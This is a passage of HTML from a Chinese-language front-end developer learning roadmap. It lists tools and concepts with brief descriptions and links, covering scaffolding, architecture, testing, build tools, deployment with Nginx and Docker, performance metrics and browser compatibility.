href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%bb%84%e4%bb%b6%ef%bc%88%e6%8f%92%e4%bb%b6%ef%bc%89">组件（插件）</a></h4><ul><li>富文本编辑器</li><li>弹窗</li><li>轮播图<br><a name="OlJxw"></a></li></ul><h4 id="工具库"><a href="#工具库" class="headerlink" title="工具库"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b7%a5%e5%85%b7%e5%ba%93">工具库</a></h4><ul><li>✅ jQuery</li><li>✅ Lodash</li><li>✅ Axios</li><li>时间处理 Moment.js<br><a name="ieLCK"></a></li></ul><h4 id="动效库"><a href="#动效库" class="headerlink" title="动效库"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%8a%a8%e6%95%88%e5%ba%93">动效库</a></h4><ul><li>✅ Animate.css</li><li>Ant Motion<br><a name="knhb5"></a></li></ul><h4 id="字体图标库"><a href="#字体图标库" class="headerlink" title="字体图标库"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ad%97%e4%bd%93%e5%9b%be%e6%a0%87%e5%ba%93">字体图标库</a></h4><ul><li>⭐️ IconFont</li><li>IconPark</li><li>Font Awesome<br><a name="niB9s"></a></li></ul><h3 id="⭐️-脚手架"><a href="#⭐️-脚手架" class="headerlink" title="⭐️ 脚手架"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e8%84%9a%e6%89%8b%e6%9e%b6">⭐️ 脚手架</a></h3><ul><li>💬 描述：快速生成新项目的目录模板，提升开发效率和开发舒适性。</li><li>📚 资源：<a href="https://www.jianshu.com/p/25ce8cf2e6a7">https://www.jianshu.com/p/25ce8cf2e6a7</a></li><li>Vue CLI</li><li>create-react-app</li><li>✅ Yeoman<br><a name="v1mgm"></a></li></ul><h3 id="⭐️-前端架构设计"><a href="#⭐️-前端架构设计" class="headerlink" title="⭐️ 前端架构设计"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e5%89%8d%e7%ab%af%e6%9e%b6%e6%9e%84%e8%ae%be%e8%ae%a1">⭐️ 前端架构设计</a></h3><ul><li>💬 描述：一系列工具和流程的集合，旨在提升前端代码的质量，并实现高效可持续的工作流。</li><li>模块化</li><li>组件化</li><li>✅ MVVM</li><li>设计原则</li><li>⭐️ SPA 单页应用</li><li>⭐️ 多页应用</li><li>✅ 前端路由</li><li>PWA</li><li>有损服务<br><a name="u45JW"></a></li></ul><h4 id="✅-服务端渲染"><a href="#✅-服务端渲染" class="headerlink" title="✅ 服务端渲染"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%b8%b2%e6%9f%93">✅ 服务端渲染</a></h4><ul><li>💬 描述：在服务端渲染 HTML 页面的模式。</li><li>📚 资源：<a href="https://www.zhihu.com/question/379563505">https://www.zhihu.com/question/379563505</a></li><li>Next.js（React）</li><li>Nuxt.js（Vue）</li><li>❌ Universal（Angular）<br><a name="XP4By"></a></li></ul><h4 id="BFF"><a href="#BFF" class="headerlink" title="BFF"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=bff">BFF</a></h4><ul><li>💬 描述：Backend For Frontend（服务于前端的后端），就是服务器设计 API 时会考虑前端的使用，并在服务端直接进行业务逻辑的处理。</li><li>📚 资源：<a href="https://www.jianshu.com/p/eb1875c62ad3">https://www.jianshu.com/p/eb1875c62ad3</a></li><li>GraphQL<br><a name="o7wK0"></a></li></ul><h4 id="✅-微前端"><a href="#✅-微前端" class="headerlink" title="✅ 微前端"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%be%ae%e5%89%8d%e7%ab%af">✅ 微前端</a></h4><ul><li>💬 描述：将前端应用分解成一些更小、更简单的能够独立开发、测试、部署的小块，从而解决庞大的一整块后端服务带来的变更与扩展方面的限制。</li><li>📚 资源：<a href="https://zhuanlan.zhihu.com/p/96464401">https://zhuanlan.zhihu.com/p/96464401</a></li><li>qiankun</li><li>single-spa<br><a name="ueIQy"></a></li></ul><h3 id="CSS-in-JS"><a href="#CSS-in-JS" class="headerlink" title="CSS in JS"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=css-in-js">CSS in JS</a></h3><ul><li>💬 描述：用 JavaScript 来写 CSS。</li><li>📚 资源：<a href="http://www.ruanyifeng.com/blog/2017/04/css_in_js.html">http://www.ruanyifeng.com/blog/2017/04/css_in_js.html</a></li><li>内联样式</li><li>声明样式</li><li>引入样式<br><a name="C0nXO"></a></li></ul><h4 id="⭐️-CSS-模块化"><a href="#⭐️-CSS-模块化" class="headerlink" title="⭐️ CSS 模块化"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css-%e6%a8%a1%e5%9d%97%e5%8c%96">⭐️ CSS 模块化</a></h4><ul><li>⭐️ CSS Modules</li><li>✅ styled-components</li><li>✅ Styled JSX</li><li>Emotion<br><a name="paew9"></a></li></ul><h3 id="✅-开发调试"><a href="#✅-开发调试" class="headerlink" title="✅ 开发调试"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%bc%80%e5%8f%91%e8%b0%83%e8%af%95">✅ 开发调试</a></h3><ul><li>💬 描述：本地开发时热更新，提升开发效率。</li><li>webpack-dev-server</li><li>serve<br><a name="XAwxM"></a></li></ul><h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f">内网穿透</a></h4><ul><li>💬 描述：将内网外网通过 nat 隧道打通，让内网的网站、数据让外网可以访问。</li><li>Ngrok</li><li>NATAPP<br><a name="OkBJO"></a></li></ul><h3 id="⭐️-CSS-预编译"><a href="#⭐️-CSS-预编译" class="headerlink" title="⭐️ CSS 预编译"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css-%e9%a2%84%e7%bc%96%e8%af%91">⭐️ CSS 预编译</a></h3><ul><li>💬 描述：使用新的扩展语言以增强 CSS 的能力，并通过预编译的方式将其转换为浏览器认识的 CSS 代码。</li><li>⭐️ SASS</li><li>✅ PostCSS</li><li>Stylus</li><li>❌ LESS<br><a name="e5cdH"></a></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8b%e8%af%95">测试</a></h3><p><a name="gmExj"></a></p><h4 id="测试分类"><a href="#测试分类" class="headerlink" title="测试分类"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8b%e8%af%95%e5%88%86%e7%b1%bb">测试分类</a></h4><ul><li>⭐️ UT 单元测试</li><li>SIT 系统集成测试</li><li>E2E 端到端测试</li><li>UAT 用户验收测试<br><a name="x3OME"></a></li></ul><h4 id="✅-Mock"><a href="#✅-Mock" class="headerlink" title="✅ Mock"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-mock">✅ Mock</a></h4><ul><li>💬 描述：通过随机数据，模拟各种场景，增加单元测试的真实性。</li><li>Mock.js<br><a name="Y0q2U"></a></li></ul><h4 id="✅-测试框架"><a href="#✅-测试框架" class="headerlink" title="✅ 测试框架"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%b5%8b%e8%af%95%e6%a1%86%e6%9e%b6">✅ 测试框架</a></h4><ul><li>✅ Jest</li><li>Enzyme</li><li>✅ Puppeteer（Headless Browser）</li><li>Mocha</li><li>Jasmine<br><a name="Dkisw"></a></li></ul><h3 id="✅-代码质量"><a href="#✅-代码质量" class="headerlink" title="✅ 代码质量"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e4%bb%a3%e7%a0%81%e8%b4%a8%e9%87%8f">✅ 代码质量</a></h3><p><a name="AaiHK"></a></p><h4 id="开发规范"><a href="#开发规范" class="headerlink" title="开发规范"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91%e8%a7%84%e8%8c%83">开发规范</a></h4><ul><li>💬 描述：依照规范写出的代码会更加合理。</li><li>📚 资源：Airbnb 代码规范 <a href="https://github.com/BingKui/javascript-zh">https://github.com/BingKui/javascript-zh</a></li><li>CSS Style Guide</li><li>JavaScript Style Guide<br><a name="FAW83"></a></li></ul><h4 id="类型校验"><a href="#类型校验" class="headerlink" title="类型校验"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%b1%bb%e5%9e%8b%e6%a0%a1%e9%aa%8c">类型校验</a></h4><ul><li>TypeScript<br><a name="uEa0B"></a></li></ul><h4 id="代码检查"><a href="#代码检查" class="headerlink" title="代码检查"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bb%a3%e7%a0%81%e6%a3%80%e6%9f%a5">代码检查</a></h4><ul><li>ESLint</li><li>StyleLint<br><a name="AkaBD"></a></li></ul><h4 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bb%a3%e7%a0%81%e9%a3%8e%e6%a0%bc">代码风格</a></h4><ul><li>💬 描述：根据配置自动格式化代码，统一格式。</li><li>Prettier<br><a name="LtxFL"></a></li></ul><h4 id="提交规范"><a href="#提交规范" class="headerlink" title="提交规范"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%8f%90%e4%ba%a4%e8%a7%84%e8%8c%83">提交规范</a></h4><ul><li>约定式提交<br><a name="DDmb8"></a></li></ul><h4 id="提交检查"><a href="#提交检查" class="headerlink" title="提交检查"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%8f%90%e4%ba%a4%e6%a3%80%e6%9f%a5">提交检查</a></h4><ul><li>💬 描述：在提交代码时触发一些操作，比如检查代码的风格等。</li><li>pre-commit</li><li>husky<br><a name="Yu8um"></a></li></ul><h3 id="构建工具"><a href="#构建工具" class="headerlink" title="构建工具"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%9e%84%e5%bb%ba%e5%b7%a5%e5%85%b7">构建工具</a></h3><p><a name="wTuza"></a></p><h4 id="自动化构建"><a href="#自动化构建" class="headerlink" title="自动化构建"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%87%aa%e5%8a%a8%e5%8c%96%e6%9e%84%e5%bb%ba">自动化构建</a></h4><ul><li>💬 描述：按照配置好的流程自动打包构建项目，提高团队的开发效率，降低项目的维护难度。</li><li>Gulp</li><li>✅ npm script</li><li>Grunt<br><a name="xJ4Wn"></a></li></ul><h4 id="打包工具"><a href="#打包工具" class="headerlink" title="打包工具"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%89%93%e5%8c%85%e5%b7%a5%e5%85%b7">打包工具</a></h4><ul><li>💬 描述：将各种零散的 📚 资源文件打包为可在浏览器等环境运行的代码。</li><li>⭐️ Webpack</li><li>✅ Rollup</li><li>✅ Vite</li><li>Parcel</li><li>Snowpack<br><a name="tEvPo"></a></li></ul><h3 id="CI-x2F-CD"><a href="#CI-x2F-CD" class="headerlink" title="CI &#x2F; CD"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=ci-cd">CI &#x2F; CD</a></h3><ul><li>💬 描述：通过在应用开发阶段引入自动化来频繁向客户交付应用。</li><li>GitLab CI</li><li>✅ Jenkins<br><a name="Lwm72"></a></li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%83%a8%e7%bd%b2">部署</a></h3><p><a name="lgmVF"></a></p><h4 id="⭐️-Web-服务器"><a href="#⭐️-Web-服务器" class="headerlink" title="⭐️ Web 服务器"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-web-%e6%9c%8d%e5%8a%a1%e5%99%a8">⭐️ Web 服务器</a></h4><p><a name="VMUwn"></a></p><h5 id="⭐️-Nginx"><a href="#⭐️-Nginx" class="headerlink" title="⭐️ Nginx"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-nginx">⭐️ Nginx</a></h5><ul><li>💬 描述：高性能的 HTTP 和反向代理 web 服务器。</li><li>📚 资源：腾讯云动手实验室 <a href="https://cloud.tencent.com/developer/labs/gallery">https://cloud.tencent.com/developer/labs/gallery</a></li><li>反向代理</li><li>解决跨域</li><li>改写请求<br><a name="LLcON"></a></li></ul><h5 id="✅-Apache"><a href="#✅-Apache" class="headerlink" title="✅ Apache"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-apache">✅ Apache</a></h5><p><a name="MDNR1"></a></p><h4 id="容器"><a href="#容器" class="headerlink" title="容器"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ae%b9%e5%99%a8">容器</a></h4><p><a name="ktM3t"></a></p><h5 id="✅-Docker"><a href="#✅-Docker" class="headerlink" title="✅ Docker"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-docker">✅ Docker</a></h5><ul><li>💬 描述：容器是一个标准化的软件单元，它将代码及其所有依赖关系打包，以便应用程序从一个计算环境可靠快速地运行到另一个计算环境。Docker 容器镜像是一个轻量的独立的可执行的软件包。包含程序运行的时候所需的一切：代码，运行时间，系统工具，系统库和设置。</li><li>📚 资源：Docker 从入门到实践 <a href="https://vuepress.mirror.docker-practice.com/">https://vuepress.mirror.docker-practice.com/</a></li><li>Dockerfile<br><a name="cGWqs"></a></li></ul><h5 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=kubernetes">Kubernetes</a></h5><p><a name="cfkph"></a></p><h4 id="部署策略"><a href="#部署策略" class="headerlink" title="部署策略"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%83%a8%e7%bd%b2%e7%ad%96%e7%95%a5">部署策略</a></h4><ul><li>全量发布</li><li>蓝绿部署</li><li>滚动发布</li><li>灰度发布<br><a name="WLZRY"></a></li></ul><h3 id="监控告警"><a href="#监控告警" class="headerlink" title="监控告警"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%9b%91%e6%8e%a7%e5%91%8a%e8%ad%a6">监控告警</a></h3><ul><li>前端埋点</li><li>错误监控</li><li>性能监控</li><li>行为监控<br><a name="OX69O"></a></li></ul><h2 id="四、前端优化"><a href="#四、前端优化" class="headerlink" title="四、前端优化"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%9b%9b%e3%80%81%e5%89%8d%e7%ab%af%e4%bc%98%e5%8c%96">四、前端优化</a></h2><ul><li>💬 描述：通过分析和优化手段，提高网站的性能和用户体验。</li><li>🎯 目标：实践前端优化方法，从多个方面优化自己做过的项目，最好能将优化后的网站与原网站进行对比，得到一些数据和体验上的明显提升。<br><a name="d633E"></a></li></ul><h3 id="✅-性能优化"><a href="#✅-性能优化" class="headerlink" title="✅ 性能优化"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%80%a7%e8%83%bd%e4%bc%98%e5%8c%96">✅ 性能优化</a></h3><p><a name="qdDwT"></a></p><h4 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%80%a7%e8%83%bd%e6%8c%87%e6%a0%87">性能指标</a></h4><ul><li>💬 描述：用于衡量一个 Web 页面的性能。</li><li>📚 资源：<a href="https://juejin.cn/post/6844904153869713416">https://juejin.cn/post/6844904153869713416</a></li><li>FP（First Paint）<ul><li>💬 描述：从开始加载到浏览器首次绘制像素到屏幕上的时间，也就是页面在屏幕上首次发生视觉变化的时间。</li></ul></li><li>FCP（First Contentful Paint）<ul><li>💬 描述：浏览器首次绘制来自 DOM 的内容的时间。</li></ul></li><li>FMP（First Meaningful Paint）<ul><li>💬 描述：页面的主要内容绘制到屏幕上的时间。</li></ul></li><li>FSP（First Screen Paint）<ul><li>💬 描述：页面从开始加载到首屏内容全部绘制完成的时间，用户可以看到首屏的全部内容。</li></ul></li><li>TTI（Time to Interactive）<ul><li>💬 描述：表示网页第一次完全达到可交互状态的时间点，浏览器已经可以持续性的响应用户的输入。<br><a name="UHm6N"></a></li></ul></li></ul><h4 id="优化手段"><a href="#优化手段" class="headerlink" title="优化手段"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bc%98%e5%8c%96%e6%89%8b%e6%ae%b5">优化手段</a></h4><ul><li>性能监控<ul><li>Performance API</li></ul></li><li>样式优化</li><li>JavaScript 优化<ul><li>防抖</li><li>节流</li></ul></li><li>代码分割</li><li>资源压缩</li><li>打包优化</li><li>服务器优化</li><li>缓存优化<ul><li>Service Worker</li></ul></li><li>动画性能</li><li>dns-prefetch</li><li>Lazy loading</li><li>优化启动性能<ul><li>异步化</li></ul></li><li>渲染优化</li><li>网络优化</li><li>移动端性能优化</li><li>✅ CDN<ul><li>💬 描述：内容分发网络，是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</li><li>📚 资源：BootCDN <a href="https://www.bootcdn.cn/">https://www.bootcdn.cn/</a><br><a name="WKZsy"></a></li></ul></li></ul><h3 id="用户体验"><a href="#用户体验" class="headerlink" title="用户体验"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%94%a8%e6%88%b7%e4%bd%93%e9%aa%8c">用户体验</a></h3><ul><li>设计系统</li><li>骨架屏<br><a name="pZ5pB"></a></li></ul><h3 id="✅-兼容性"><a href="#✅-兼容性" class="headerlink" title="✅ 兼容性"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%85%bc%e5%ae%b9%e6%80%a7">✅ 兼容性</a></h3><p><a name="VcZvb"></a></p><h4 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8f%e8%a7%88%e5%99%a8%e5%85%bc%e5%ae%b9%e6%80%a7">浏览器兼容性</a></h4><ul><li>normalize.css</li><li>html5shiv.js</li><li>respond.js</li><li>Babel</li><li>Polyfill<br><a name="uJZbW"></a></li></ul><h4 id="屏幕分辨率兼容性"><a href="#屏幕分辨率兼容性" class="headerlink" title="屏幕分辨率兼容性"></a><a 